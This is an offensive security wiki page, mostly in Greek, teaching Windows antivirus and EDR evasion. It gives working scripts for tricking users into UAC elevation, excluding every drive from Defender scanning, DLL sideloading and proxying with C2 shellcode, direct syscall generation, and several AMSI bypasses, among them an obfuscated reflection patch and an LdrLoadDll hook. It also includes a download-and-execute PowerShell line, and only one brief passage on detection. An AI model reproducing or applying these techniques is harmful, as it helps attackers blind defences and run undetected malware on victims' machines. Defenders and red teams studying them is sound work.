# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε αρχικά από** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ένα εργαλείο για να σταματήσει να λειτουργεί το Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Ένα εργαλείο για να σταματήσει να λειτουργεί το Windows Defender προσποιούμενο άλλο AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

Public loaders που παριστάνουν game cheats συχνά διανέμονται ως unsigned Node.js/Nexe installers που πρώτα **ζητούν από τον χρήστη elevation** και μόνο μετά απενεργοποιούν το Defender. Η ροή είναι απλή:

1. Ελέγχουν για administrative context με `net session`. Η εντολή πετυχαίνει μόνο όταν ο caller έχει admin rights, οπότε μια αποτυχία δείχνει ότι ο loader εκτελείται ως standard user.
2. Αμέσως κάνει relaunch τον εαυτό του με το `RunAs` verb για να ενεργοποιήσει το αναμενόμενο UAC consent prompt, διατηρώντας παράλληλα την αρχική command line.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Τα θύματα ήδη πιστεύουν ότι εγκαθιστούν «cracked» software, οπότε το prompt συνήθως γίνεται αποδεκτό, δίνοντας στο malware τα δικαιώματα που χρειάζεται για να αλλάξει την policy του Defender.

### Blanket `MpPreference` exclusions for every drive letter

Μόλις γίνει elevation, οι αλυσίδες τύπου GachiLoader μεγιστοποιούν τα blind spots του Defender αντί να απενεργοποιούν απευθείας την υπηρεσία. Ο loader πρώτα σκοτώνει το GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) και μετά κάνει push **extremely broad exclusions** ώστε κάθε user profile, system directory και removable disk να γίνεται unscannable:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Βασικές παρατηρήσεις:

- Ο βρόχος διατρέχει κάθε mounted filesystem (D:\, E:\, USB sticks, κ.λπ.), οπότε **οποιοδήποτε μελλοντικό payload απορριφθεί οπουδήποτε στον δίσκο αγνοείται**.
- Ο αποκλεισμός της επέκτασης `.sys` είναι forward-looking—οι attackers κρατούν την επιλογή να φορτώσουν unsigned drivers αργότερα χωρίς να αγγίξουν ξανά το Defender.
- Όλες οι αλλαγές καταλήγουν κάτω από το `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, επιτρέποντας σε μεταγενέστερα στάδια να επιβεβαιώσουν ότι οι exclusions παραμένουν ή να τις επεκτείνουν χωρίς να ενεργοποιήσουν ξανά UAC.

Επειδή δεν σταματά καμία Defender service, οι naïve health checks συνεχίζουν να αναφέρουν “antivirus active” παρότι το real-time inspection δεν αγγίζει ποτέ εκείνα τα paths.

## **AV Evasion Methodology**

Currently, τα AVs χρησιμοποιούν διαφορετικές μεθόδους για να ελέγξουν αν ένα file είναι malicious ή όχι, static detection, dynamic analysis, και για τα πιο advanced EDRs, behavioural analysis.

### **Static detection**

Η static detection επιτυγχάνεται με το να επισημαίνονται γνωστά malicious strings ή arrays of bytes μέσα σε ένα binary ή script, και επίσης με το να εξάγονται πληροφορίες από το ίδιο το file (π.χ. file description, company name, digital signatures, icon, checksum, κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών public tools μπορεί να σε κάνει να εντοπιστείς πιο εύκολα, καθώς πιθανότατα έχουν ήδη αναλυθεί και επισημανθεί ως malicious. Υπάρχουν μερικοί τρόποι να παρακάμψεις αυτό το είδος detection:

- **Encryption**

Αν κρυπτογραφήσεις το binary, δεν θα υπάρχει τρόπος για το AV να ανιχνεύσει το program σου, αλλά θα χρειαστείς κάποιο loader για να το αποκρυπτογραφήσει και να το τρέξει στη memory.

- **Obfuscation**

Μερικές φορές το μόνο που χρειάζεται είναι να αλλάξεις κάποια strings στο binary ή script σου για να περάσει το AV, αλλά αυτό μπορεί να είναι χρονοβόρο task ανάλογα με το τι προσπαθείς να obfuscate-άρεις.

- **Custom tooling**

Αν αναπτύξεις τα δικά σου tools, δεν θα υπάρχουν γνωστές bad signatures, αλλά αυτό απαιτεί πολύ χρόνο και effort.

> [!TIP]
> Ένας καλός τρόπος για έλεγχο απέναντι στη static detection του Windows Defender είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ουσιαστικά χωρίζει το file σε πολλαπλά segments και μετά ζητά από το Defender να σαρώσει το καθένα ξεχωριστά, έτσι μπορεί να σου πει ακριβώς ποιες είναι οι flagged strings ή bytes στο binary σου.

Σου συνιστώ ανεπιφύλακτα να δεις αυτή τη [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) για πρακτικό AV Evasion.

### **Dynamic analysis**

Dynamic analysis είναι όταν το AV τρέχει το binary σου σε ένα sandbox και παρακολουθεί για malicious activity (π.χ. προσπάθεια να αποκρυπτογραφήσει και να διαβάσει passwords του browser σου, εκτέλεση minidump στο LSASS, κ.λπ.). Αυτό το μέρος μπορεί να είναι λίγο πιο δύσκολο στη διαχείριση, αλλά υπάρχουν μερικά πράγματα που μπορείς να κάνεις για να evade-άρεις τα sandboxes.

- **Sleep πριν την εκτέλεση** Ανάλογα με το πώς υλοποιείται, μπορεί να είναι ένας εξαιρετικός τρόπος να bypass-άρεις τη dynamic analysis του AV. Τα AVs έχουν πολύ λίγο χρόνο για να σαρώσουν files ώστε να μην διακόπτουν το workflow του χρήστη, οπότε τα μεγάλα sleeps μπορούν να διαταράξουν την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά AV sandboxes μπορούν απλώς να παραλείψουν το sleep, ανάλογα με την υλοποίηση.
- **Έλεγχος των resources του machine** Συνήθως τα Sandboxes έχουν ελάχιστους πόρους στη διάθεσή τους (π.χ. < 2GB RAM), αλλιώς θα μπορούσαν να επιβραδύνουν το machine του χρήστη. Μπορείς επίσης να γίνεις πολύ δημιουργικός εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμα και τις ταχύτητες των ανεμιστήρων, καθώς δεν θα είναι όλα υλοποιημένα στο sandbox.
- **Machine-specific checks** Αν θέλεις να στοχεύσεις έναν χρήστη του οποίου το workstation είναι joined στο domain "contoso.local", μπορείς να κάνεις έναν έλεγχο στο domain του computer για να δεις αν ταιριάζει με αυτό που έχεις καθορίσει· αν δεν ταιριάζει, μπορείς να κάνεις το program σου να τερματιστεί.

Αποδεικνύεται ότι το Sandbox computername του Microsoft Defender είναι HAL9TH, οπότε μπορείς να ελέγξεις το computer name στο malware σου πριν από το detonation· αν το name ταιριάζει με HAL9TH, σημαίνει ότι βρίσκεσαι μέσα στο defender's sandbox, οπότε μπορείς να κάνεις το program σου να τερματιστεί.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικές άλλες πολύ καλές συμβουλές από τον [@mgeeky](https://twitter.com/mariuszbit) για το πώς να κινηθείς απέναντι σε Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Όπως είπαμε νωρίτερα σε αυτό το post, τα **public tools** τελικά **θα εντοπιστούν**, οπότε πρέπει να ρωτήσεις τον εαυτό σου κάτι:

Για παράδειγμα, αν θέλεις να κάνεις dump το LSASS, **χρειάζεται πραγματικά να χρησιμοποιήσεις mimikatz**; Ή θα μπορούσες να χρησιμοποιήσεις ένα διαφορετικό project που είναι λιγότερο γνωστό και κάνει επίσης dump το LSASS.

Η σωστή απάντηση είναι πιθανότατα το δεύτερο. Παίρνοντας το mimikatz ως παράδειγμα, είναι πιθανότατα ένα από τα, αν όχι το πιο flagged piece of malware από AVs και EDRs, και ενώ το ίδιο το project είναι super cool, είναι επίσης ένας εφιάλτης για να δουλέψεις μαζί του ώστε να ξεπεράσεις τα AVs, οπότε απλώς ψάξε για εναλλακτικές για αυτό που προσπαθείς να πετύχεις.

> [!TIP]
> Όταν τροποποιείς τα payloads σου για evasion, φρόντισε να **κλείσεις το automatic sample submission** στο defender, και παρακαλώ, σοβαρά, **ΜΗΝ ΑΝΕΒΑΖΕΙΣ ΣΤΟ VIRUSTOTAL** αν ο στόχος σου είναι να πετύχεις evasion μακροπρόθεσμα. Αν θέλεις να ελέγξεις αν το payload σου εντοπίζεται από κάποιο συγκεκριμένο AV, εγκατέστησέ το σε VM, προσπάθησε να κλείσεις το automatic sample submission, και δοκίμασέ το εκεί μέχρι να είσαι ικανοποιημένος με το αποτέλεσμα.

## EXEs vs DLLs

Όποτε είναι δυνατόν, να **δίνεις πάντα προτεραιότητα στη χρήση DLLs για evasion**, από την εμπειρία μου τα DLL files συνήθως **εντοπίζονται και αναλύονται πολύ λιγότερο**, οπότε είναι ένα πολύ απλό trick για να αποφύγεις το detection σε ορισμένες περιπτώσεις (αν το payload σου έχει κάποιον τρόπο να εκτελείται ως DLL φυσικά).

Όπως βλέπουμε σε αυτή την εικόνα, ένα DLL Payload από το Havoc έχει detection rate 4/26 στο antiscan.me, ενώ το EXE payload έχει detection rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me σύγκριση ενός κανονικού Havoc EXE payload με ένα κανονικό Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά tricks που μπορείς να χρησιμοποιήσεις με DLL files για να είσαι πολύ πιο stealthy.

## DLL Sideloading & Proxying

Το **DLL Sideloading** εκμεταλλεύεται τη DLL search order που χρησιμοποιεί ο loader, τοποθετώντας τόσο την εφαρμογή-θύμα όσο και το malicious payload(s) δίπλα-δίπλα.

Μπορείς να ελέγξεις για προγράμματα που είναι ευάλωτα σε DLL Sideloading χρησιμοποιώντας το [Siofra](https://github.com/Cybereason/siofra) και το ακόλουθο powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων που είναι ευάλωτα σε DLL hijacking μέσα στο "C:\Program Files\\" και τα DLL αρχεία που προσπαθούν να φορτώσουν.

Σας προτείνω έντονα να **εξερευνήσετε μόνοι σας DLL Hijackable/Sideloadable προγράμματα**, αυτή η τεχνική είναι αρκετά stealthy όταν γίνεται σωστά, αλλά αν χρησιμοποιήσετε δημόσια γνωστά DLL Sideloadable προγράμματα, μπορεί να πιαστείτε εύκολα.

Μόνο και μόνο αν τοποθετήσετε ένα malicious DLL με το όνομα που περιμένει να φορτώσει ένα πρόγραμμα, δεν θα φορτώσει το payload σας, καθώς το πρόγραμμα περιμένει κάποιες συγκεκριμένες συναρτήσεις μέσα σε αυτό το DLL, για να διορθώσουμε αυτό το ζήτημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

Το **DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από το proxy (και malicious) DLL προς το αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας τον χειρισμό της εκτέλεσης του payload σας.

Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) από τον [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα template πηγαίου κώδικα DLL και το αρχικό μετονομασμένο DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Αυτά είναι τα αποτελέσματα:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Τόσο το shellcode μας (encoded με [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν 0/26 Detection rate στο [antiscan.me](https://antiscan.me)! Θα το έλεγα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Σας **συνιστώ ανεπιφύλακτα** να δείτε το [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) σχετικά με DLL Sideloading και επίσης το [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) για να μάθετε περισσότερα για όσα συζητήσαμε πιο αναλυτικά.

### Abusing Forwarded Exports (ForwardSideLoading)

Τα Windows PE modules μπορούν να κάνουν export functions που στην πραγματικότητα είναι "forwarders": αντί να δείχνει σε code, η export entry περιέχει ένα ASCII string της μορφής `TargetDll.TargetFunc`. Όταν ένας caller επιλύει το export, το Windows loader θα:

- Φορτώσει το `TargetDll` αν δεν είναι ήδη φορτωμένο
- Επιλύσει το `TargetFunc` από αυτό

Βασικές συμπεριφορές που πρέπει να κατανοήσετε:
- Αν το `TargetDll` είναι KnownDLL, παρέχεται από το προστατευμένο namespace KnownDLLs (π.χ. ntdll, kernelbase, ole32).
- Αν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική DLL search order, η οποία περιλαμβάνει τον κατάλογο του module που κάνει το forward resolution.

Αυτό επιτρέπει ένα indirect sideloading primitive: βρείτε ένα signed DLL που κάνει export μια function forwarded σε ένα non-KnownDLL module name, και μετά τοποθετήστε δίπλα αυτό το signed DLL με ένα attacker-controlled DLL που ονομάζεται ακριβώς όπως το forwarded target module. Όταν γίνει invoke το forwarded export, ο loader επιλύει το forward και φορτώνει το δικό σας DLL από τον ίδιο κατάλογο, εκτελώντας το DllMain σας.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` δεν είναι ένα KnownDLL, οπότε επιλύεται μέσω της κανονικής σειράς αναζήτησης.

PoC (copy-paste):
1) Αντέγραψε το signed system DLL σε έναν writable φάκελο
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο DllMain αρκεί για να επιτευχθεί code execution· δεν χρειάζεται να υλοποιήσετε τη forwarded function για να ενεργοποιηθεί το DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Ενεργοποιήστε το forward με ένα signed LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Παρατηρημένη συμπεριφορά:
- το rundll32 (signed) φορτώνει το side-by-side `keyiso.dll` (signed)
- Ενώ επιλύει το `KeyIsoSetAuditingInterface`, ο loader ακολουθεί το forward στο `NCRYPTPROV.SetAuditingInterface`
- Ο loader μετά φορτώνει το `NCRYPTPROV.dll` από `C:\test` και εκτελεί το `DllMain` του
- Αν το `SetAuditingInterface` δεν έχει υλοποιηθεί, θα πάρεις ένα σφάλμα "missing API" μόνο αφού το `DllMain` έχει ήδη εκτελεστεί

Hunting tips:
- Εστίασε σε forwarded exports όπου το target module δεν είναι ένα KnownDLL. Τα KnownDLLs παρατίθενται στο `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείς να απαριθμήσεις forwarded exports με tooling όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε το Windows 11 forwarder inventory για να αναζητήσετε υποψηφίους: https://hexacorn.com/d/apis_fwd.txt

Ιδέες ανίχνευσης/άμυνας:
- Παρακολουθήστε LOLBins (π.χ. rundll32.exe) που φορτώνουν signed DLLs από μη-system paths, ακολουθούμενα από φόρτωση non-KnownDLLs με το ίδιο base name από εκείνο το directory
- Ειδοποιήστε για chains διεργασιών/module όπως: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` κάτω από user-writable paths
- Επιβάλετε code integrity policies (WDAC/AppLocker) και deny write+execute σε application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με stealthy τρόπο.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Η αποφυγή είναι απλώς ένα παιχνίδι γάτας & ποντικιού, ό,τι λειτουργεί σήμερα μπορεί να εντοπιστεί αύριο, οπότε μην βασίζεσαι ποτέ σε μόνο ένα tool, αν είναι δυνατόν, προσπάθησε να αλυσιδώσεις πολλαπλές τεχνικές αποφυγής.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

Τα EDRs συχνά βάζουν **user-mode inline hooks** στα `ntdll.dll` syscall stubs. Για να παρακάμψεις αυτά τα hooks, μπορείς να δημιουργήσεις **direct** ή **indirect** syscall stubs που φορτώνουν το σωστό **SSN** (System Service Number) και μεταβαίνουν σε kernel mode χωρίς να εκτελέσουν το hooked export entrypoint.

**Invocation options:**
- **Direct (embedded)**: emit a `syscall`/`sysenter`/`SVC #0` instruction στο generated stub (no `ntdll` export hit).
- **Indirect**: κάνε jump σε ένα υπάρχον `syscall` gadget μέσα στο `ntdll` ώστε η kernel transition να φαίνεται ότι προέρχεται από το `ntdll` (χρήσιμο για heuristic evasion); το **randomized indirect** επιλέγει ένα gadget από ένα pool ανά call.
- **Egg-hunt**: απέφυγε το embedding της στατικής ακολουθίας opcode `0F 05` στο disk; resolve a syscall sequence at runtime.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: infer SSNs ταξινομώντας τα syscall stubs by virtual address αντί να διαβάζεις τα stub bytes.
- **SyscallsFromDisk**: map ένα clean `\KnownDlls\ntdll.dll`, read SSNs from its `.text`, then unmap (bypasses all in-memory hooks).
- **RecycledGate**: combine VA-sorted SSN inference με opcode validation όταν ένα stub is clean; fall back to VA inference if hooked.
- **HW Breakpoint**: set DR0 on the `syscall` instruction and use a VEH to capture the SSN from `EAX` at runtime, without parsing hooked bytes.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

Το AMSI δημιουργήθηκε για να αποτρέψει "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AVs μπορούσαν να κάνουν scan μόνο σε **αρχεία στο δίσκο**, οπότε αν μπορούσες με κάποιον τρόπο να εκτελέσεις payloads **απευθείας in-memory**, το AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε αρκετή ορατότητα.

Το χαρακτηριστικό AMSI είναι ενσωματωμένο σε αυτά τα components των Windows.

- User Account Control, ή UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Επιτρέπει στις antivirus solutions να επιθεωρούν τη συμπεριφορά των scripts εκθέτοντας το περιεχόμενό τους σε μορφή που είναι τόσο unencrypted όσο και unobfuscated.

Η εκτέλεση του `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα παράγει το ακόλουθο alert στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατήρησε πώς προσθέτει το `amsi:` και μετά το path προς το executable από το οποίο εκτελέστηκε το script, σε αυτή την περίπτωση, powershell.exe

Δεν αφήσαμε κανένα αρχείο στο δίσκο, αλλά παρ' όλα αυτά εντοπιστήκαμε in-memory λόγω του AMSI.

Επιπλέον, από το **.NET 4.8** και μετά, ο κώδικας C# περνάει επίσης μέσω AMSI. Αυτό επηρεάζει ακόμη και το `Assembly.Load(byte[])` για in-memory execution. Γι' αυτό η χρήση χαμηλότερων εκδόσεων του .NET (όπως 4.7.2 ή κάτω) συνιστάται για in-memory execution αν θέλεις να evade AMSI.

Υπάρχουν μερικοί τρόποι για να παρακάμψεις το AMSI:

- **Obfuscation**

Αφού το AMSI λειτουργεί κυρίως με static detections, η τροποποίηση των scripts που προσπαθείς να φορτώσεις μπορεί να είναι καλός τρόπος για evading detection.

Ωστόσο, το AMSI έχει τη δυνατότητα να unobfuscate scripts ακόμη κι αν έχουν πολλαπλά layers, οπότε το obfuscation μπορεί να είναι κακή επιλογή ανάλογα με το πώς γίνεται. Αυτό το κάνει όχι και τόσο straightforward για να το evade. Παρ' όλα αυτά, μερικές φορές το μόνο που χρειάζεται είναι να αλλάξεις μερικά variable names και είσαι εντάξει, οπότε εξαρτάται από το πόσο έχει flagαριστεί κάτι.

- **AMSI Bypass**

Αφού το AMSI υλοποιείται με τη φόρτωση μιας DLL μέσα στη διεργασία του powershell (επίσης cscript.exe, wscript.exe, κ.λπ.), είναι δυνατό να το tamper with εύκολα ακόμη και ως unprivileged user. Λόγω αυτού του flaw στην υλοποίηση του AMSI, οι researchers έχουν βρει πολλούς τρόπους να evade το AMSI scanning.

**Forcing an Error**

Το να προκαλέσεις αποτυχία στο AMSI initialization (amsiInitFailed) θα έχει ως αποτέλεσμα να μην ξεκινήσει κανένα scan για την τρέχουσα process. Αρχικά αυτό αποκαλύφθηκε από τον [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft έχει αναπτύξει ένα signature για να αποτρέψει την ευρύτερη χρήση του.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
All it took was one line of powershell code to render AMSI μη χρησιμοποιήσιμο για τη τρέχουσα διεργασία powershell. Αυτή η γραμμή φυσικά έχει επισημανθεί από το ίδιο το AMSI, οπότε χρειάζεται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Εδώ είναι ένα τροποποιημένο AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Να έχετε υπόψη ότι αυτό πιθανότατα θα επισημανθεί μόλις δημοσιευτεί αυτό το post, οπότε δεν πρέπει να δημοσιεύσετε κανέναν κώδικα αν ο στόχος σας είναι να παραμείνετε απαρατήρητοι.

**Memory Patching**

Αυτή η τεχνική ανακαλύφθηκε αρχικά από τον [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει τον εντοπισμό της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στο amsi.dll (η οποία είναι υπεύθυνη για το scanning του input που παρέχει ο χρήστης) και την αντικατάστασή της με instructions ώστε να επιστρέφει τον κωδικό για E_INVALIDARG, έτσι ώστε το αποτέλεσμα του πραγματικού scan να επιστρέφει 0, το οποίο ερμηνεύεται ως clean αποτέλεσμα.

> [!TIP]
> Παρακαλώ διαβάστε το [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για μια πιο λεπτομερή εξήγηση.

Υπάρχουν επίσης πολλές άλλες τεχνικές που χρησιμοποιούνται για να παρακάμψουν το AMSI με powershell, δείτε [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) και [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθετε περισσότερα γι' αυτές.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

Το AMSI αρχικοποιείται μόνο αφού το `amsi.dll` φορτωθεί στο τρέχον process. Μια robust, language‑agnostic bypass είναι να τοποθετήσετε ένα user‑mode hook στο `ntdll!LdrLoadDll` που επιστρέφει ένα error όταν το ζητούμενο module είναι το `amsi.dll`. Ως αποτέλεσμα, το AMSI δεν φορτώνεται ποτέ και δεν πραγματοποιούνται scans για εκείνο το process.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Σημειώσεις
- Λειτουργεί σε PowerShell, WScript/CScript και custom loaders το ίδιο (οτιδήποτε θα φόρτωνε αλλιώς το AMSI).
- Συνδύασέ το με τροφοδότηση scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) για να αποφύγεις μεγάλα command-line artefacts.
- Έχει παρατηρηθεί να χρησιμοποιείται από loaders που εκτελούνται μέσω LOLBins (π.χ. `regsvr32` που καλεί `DllRegisterServer`).

Το tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** επίσης δημιουργεί script για bypass του AMSI.
Το tool **[https://amsibypass.com/](https://amsibypass.com/)** επίσης δημιουργεί script για bypass του AMSI που αποφεύγουν signatures μέσω τυχαιοποιημένης user-defined function, variables, characters expression και εφαρμόζει τυχαίο casing χαρακτήρων στα PowerShell keywords για αποφυγή signatures.

**Αφαίρεσε το ανιχνευμένο signature**

Μπορείς να χρησιμοποιήσεις ένα tool όπως το **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και το **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσεις το ανιχνευμένο AMSI signature από τη μνήμη της τρέχουσας διεργασίας. Αυτό το tool λειτουργεί σαρώνοντας τη μνήμη της τρέχουσας διεργασίας για το AMSI signature και στη συνέχεια αντικαθιστώντας το με NOP instructions, αφαιρώντας το ουσιαστικά από τη μνήμη.

**Προϊόντα AV/EDR που χρησιμοποιούν AMSI**

Μπορείς να βρεις μια λίστα από AV/EDR products που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Χρησιμοποίησε Powershell version 2**
Αν χρησιμοποιήσεις PowerShell version 2, το AMSI δεν θα φορτωθεί, οπότε μπορείς να εκτελέσεις τα scripts σου χωρίς να σαρωθούν από το AMSI. Μπορείς να το κάνεις έτσι:
```bash
powershell.exe -version 2
```
## PS Logging

